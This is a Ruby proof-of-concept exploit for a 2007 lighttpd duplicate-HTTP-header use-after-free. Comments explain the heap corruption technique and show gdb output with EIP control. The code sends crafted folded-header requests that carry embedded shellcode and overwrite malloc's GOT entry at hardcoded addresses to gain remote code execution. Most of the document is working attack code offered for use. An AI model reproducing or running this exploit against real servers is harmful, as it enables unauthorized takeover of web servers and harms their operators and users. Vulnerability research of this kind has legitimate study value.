#!/usr/bin/ruby

=begin
   lighttpd Duplicate HTTP Header Vulnerability PoC Exploit
   Ref: http://www.lighttpd.net/assets/2007/7/24/lighttpd_sa2007_03.txt

   Fun of DoS_to_Pwnage
=end

=begin
   Vuln:
      * lighttpd maintains an array (struct array) to store http headers as key value pairs
      * in case of a duplicate header entry, the source data string (struct data_string *ds) is
        free'd
      * If there is folding in the duplicate header field, value of the entry is copied to the free'd
        memory (dangling pointer dereference)
      * If realloc is triggered during copy (buffer_prepare_append) or later, heap corruption is detected
        by libc memory allocator and abort() is triggered

   Problem:
      * *BSD/PHK-malloc: struct pgfree/pginfo needs to be targeted
      * Linux/DL-malloc detects memory corruption through the sanity checks
      * Upto 63 bytes of data can be copied to dangling area in heap, if more, realloc is triggered which
        detects heap corruption and abort()s

   VooDoo:
      * Exploitable in DLMalloc because of nice _small_ chunk handlings :)
         * ds->value -> X
         * ds->value->ptr -> X - y
      * Exploitable because lighttpd abstract data type structures on heap and its handling

   * Linux/2.6 DL-malloc trick *
      * On sending duplicate http header, http_request_parse() calls array_insert_unique
        which finds the previous entry of the duplicate key in hash and appends the value
        and deletes the duplicate instance (struct data_string *ds) (data_string.c)
      * In case of a folding in the duplicate header entry, ds remains dangling pointer on
        heap which was free'd previously and the folded line is copied to ds->value->ptr thus
        allowing us to overwrite ds->value pointer due to special characteristics of DL/malloc
        8/16/32 byte chunk handlings
      * At the next line folding, our data is copied to ds->value->ptr (dangling ref) again but
        now we control ds->value and hence we have a arbitrary memory overwrite

        ---
        (gdb) r -D -f ./lighttpd.conf
        Starting program: /opt/lighthttpd/sbin/lighttpd -D -f ./lighttpd.conf
        Failed to read a valid object file image from memory.

        Program received signal SIGSEGV, Segmentation fault.
        0x41424344 in ?? ()
        (gdb) i r $eip
        eip            0x41424344       0x41424344
        (gdb)
        ---

   * Can be Reliable?? *
   Pass1: Dig the heap and fill it up with our data
   Pass2: Copy our data on dangling ptr (ds is free'd by array_insert_unique in case of duplicate key)
          *make sure realloc is not triggered in buffer_prepare_append*
   Pass3: Dummy connect to allocate new data_string on heap with function pointers
   Pass4: Attempt to copy *BIG* data on dangling ptr (need realloc corruption bypass) and overwrite function
          pointers
          close connection
          *triggered pwn*

   - Abhisek Datta (24/08/2007) abhisek[dot]datta[at]gmail[dot]com
=end

require 'socket'

#shellcode = ("A" * 100) + ("\xcc" * 10)

# # http://www.metasploit.com
# # Badchars: 0x00 0x0a 0x0d 0x80 
shellcode = "\x6a\x14\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x33\x96" +
            "\xa3\xc4\x83\xeb\xfc\xe2\xf4\x02\x4d\x54\x27\x60\xd5\xf0\xae" +
            "\x31\x1f\x42\x74\x55\x5b\x23\x9f\x6d\xc4\xcb\x3b\x31\x87\xff" +
            "\xae\x23\xc7\xf3\x4d\xd2\xfc\xc5\x9c\xfe\x16\x2a\x85\x37\x25" +
            "\xa7\x74\x55\x5b\x23\x87\x83\xf0\x6e\x44\xa0\xcf\xc9\xfb\x6b" +
            "\x5b\x23\x8d\x4a\x6e\xcb\xeb\x1c\xe5\xcb\xac\x1c\xf4\xca\xaa" +
            "\xba\x75\xf3\x97\xba\x77\x13\xcf\xfe\x16\xa3\xc4"

def send_http(method, path, sock = nil, host = ARGV[0], port = ARGV[1])
   request = String.new
   opts = yield

   request << "#{method} #{path} HTTP/1.1\r\n"
   opts.each {|h| request << "#{h.keys[0].to_s}#{h.keys[0].to_s.strip.empty? ? "" : ":"} #{h[h.keys[0]].to_s}\r\n"}
   request << "\r\n\r\n"

   sock = TCPSocket.new(host, port) if sock.nil?
   sock.send(request, request.length)

   sock
end

#
# Gentoo/linux-2.6/glibc-2.4-r3: 080731a0 R_386_JUMP_SLOT   malloc
# Slackware 10.1.0: 08071198 R_386_JUMP_SLOT   malloc
#

# badchars: 0x00 0x0d
if __FILE__ == $0
   host = ARGV[0].to_s
   port = ARGV[1].to_i

   malloc_got = 0x080731a0 # objdump -R ./sbin/lighttpd | grep malloc - *UNRELIABLE*

   where = malloc_got - 3
   
   # 0xffffe411 <__kernel_vsyscall+17>:      pop    %edx
   # 0xffffe412 <__kernel_vsyscall+18>:      pop    %ecx
   # 0xffffe413 <__kernel_vsyscall+19>:      ret

   what = 0xffffe411

   # (gdb) i r $eip
   # eip            0x41424344       0x41424344
   # (gdb) x/4x $esp
   # 0xbfe4016c:     0x0805d7fe      0x00000040      0x080abf08      0x080abe10
   # (gdb) x/s 0x080abf08
   # 0x80abf08:       "GET /index.html HTTP/1.1\r\nHost: 127.0.0.1:3001\r\nUser-Agent: ", 'A' <repeats 100 times>, "\r\nDummy1: ", 'P' <repeats 30 times>...
   # (gdb)

   jumper = "\xeb" + [64].pack('C') # No 0x0d, 0x20, 0x00, 0x80, 0xff in jumper

   off = 0x42424242 - 27
   loc = where - off + 1 - 27

   exp_sock = send_http("GET", "\x23BB#{jumper}AA.html") do
      [
         {"Host" => "#{host}:#{port}"},
         #{"Connection" => "keep-alive"},
         {"User-Agent" => "A" * 50 + shellcode}, # Shellcode goes here
         {"Dummy1" => "P" * 100},
         {"Dummy2" => "P" * 100},
         {"Dummy3" => "P" * 100},
         {"User-Agent" => "AAAAAAAAA"}, # > 8 for DL malloc
         {" " => ("P" * 13) + [loc].pack('V') + [off].pack('V') + "CCCC"},
         {" " => ("P") + [what].pack('V') + "ZZZZZ"} # > 8 for DL malloc
      ]
   end
   sleep(5)
=begin
   100.times do
      sock = send_http("GET", "/index.html") do
         [
            {"Host" => "#{host}:#{port}"},
            {"Connection" => "keep-alive"},
            {"User-Agent" => "A" * 100},
            {"Dummy1" => "P" * 100},
            {"Dummy2" => "P" * 100},
            #{"User-Agent" => "A"},
         ]
      end
      puts "Eater: " + sock.readline
   end
=end

=begin
   exp_sock = send_http("GET", "/index.html", exp_sock) do
      [
         {"Host" => "#{host}:#{port}"},
         #{"Connection" => "keep-alive"},
         {"User-Agent" => "A" * 100},
         {"Dummy1" => "P" * 100},
         {"Dummy2" => "P" * 100},
         {"User-Agent" => "A"},
         {"  " => "P" * 64},
      ]
   end
   sleep(1)
=end

   $stdin.readline
end
